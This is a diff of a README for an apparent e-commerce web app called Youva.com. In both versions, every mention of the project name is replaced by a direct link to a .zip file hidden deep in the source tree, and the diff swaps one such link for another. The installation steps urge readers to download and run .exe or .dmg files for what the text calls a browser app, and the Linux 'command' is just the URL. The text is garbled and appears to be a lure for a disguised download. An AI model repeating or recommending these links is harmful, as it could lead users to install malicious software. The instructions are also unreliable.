@@ -1,16 +1,16 @@
-# 🌐 https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip -  Your One-Stop E-Commerce Solution
+# 🌐 https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip -  Your One-Stop E-Commerce Solution
 
-[![Download https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip](https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip%https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip%20-%20Latest%20Release-blue)](https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip)
+[![Download https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip](https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip%https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip%20-%20Latest%20Release-blue)](https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip)
 
 ## 📋 Description
 
-https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip is an e-commerce platform offering features like product listing, cart management, user authentication, and admin CRUD operations — all built with a responsive design. This application allows users to browse products, manage their shopping carts efficiently, and securely log in to their accounts. Admin users can easily manage products and orders through a straightforward interface.
+https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip is an e-commerce platform offering features like product listing, cart management, user authentication, and admin CRUD operations — all built with a responsive design. This application allows users to browse products, manage their shopping carts efficiently, and securely log in to their accounts. Admin users can easily manage products and orders through a straightforward interface.
 
 ## 🚀 Getting Started
 
 ### 1. System Requirements
 
-To run https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip smoothly, ensure your system meets the following requirements:
+To run https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip smoothly, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10, macOS, or Linux
 - **Browser:** Latest version of Chrome, Firefox, Edge, or Safari
@@ -18,20 +18,20 @@ To run https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/page
 
 ### 2. Download & Install
 
-To get started with https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip, visit this page to download: [https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip Releases](https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip). From there, select the latest version available for download.
+To get started with https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip, visit this page to download: [https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip Releases](https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip). From there, select the latest version available for download.
 
 ### 3. Installation Steps
 
-1. Once on the Releases page, locate the **latest release** of https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip
+1. Once on the Releases page, locate the **latest release** of https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip
 2. Click on the download link for your operating system.
 3. The application file will start downloading to your device.
 4. After the download is complete, locate the file in your downloads folder.
 
    - For **Windows Users:** Run the `.exe` file and follow the on-screen instructions.
-   - For **macOS Users:** Open the `.dmg` file and drag the https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip icon to your Applications folder.
-   - For **Linux Users:** Use the terminal to navigate to the download location and run the app with the command `https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip`.
+   - For **macOS Users:** Open the `.dmg` file and drag the https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip icon to your Applications folder.
+   - For **Linux Users:** Use the terminal to navigate to the download location and run the app with the command `https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip`.
 
-5. Once installed, open https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip from your applications.
+5. Once installed, open https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip from your applications.
 
 ## 🛠️ Features
 
@@ -43,13 +43,13 @@ To get started with https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main
 
 ## 📥 Download Link
 
-You can download the latest version of https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip again here: [https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip Releases](https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip).
+You can download the latest version of https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip again here: [https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip Releases](https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip).
 
 ## 🔧 How to Use
 
 ### 1. Creating an Account
 
-1. Open https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip
+1. Open https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip
 2. Click on the “Sign Up” button.
 3. Fill in your details and create a secure password.
 4. Verify your email address if prompted.
@@ -86,4 +86,4 @@ For persistent problems, refer to the issues section on GitHub for solutions.
 
 If you need further assistance, you can open an issue on our GitHub page. Our community and contributors are here to help you with any questions.
 
-[![Download https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip](https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip%https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip%20-%20Latest%20Release-blue)](https://raw.githubusercontent.com/KIRANSK2404/Youva.com/main/src/app/pages/header/product/toys/com_Youva_v3.8.zip)
+[![Download https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip](https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip%https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip%20-%20Latest%20Release-blue)](https://github.com/KIRANSK2404/Youva.com/raw/refs/heads/main/src/app/services/Product/Youva_com_1.8.zip)
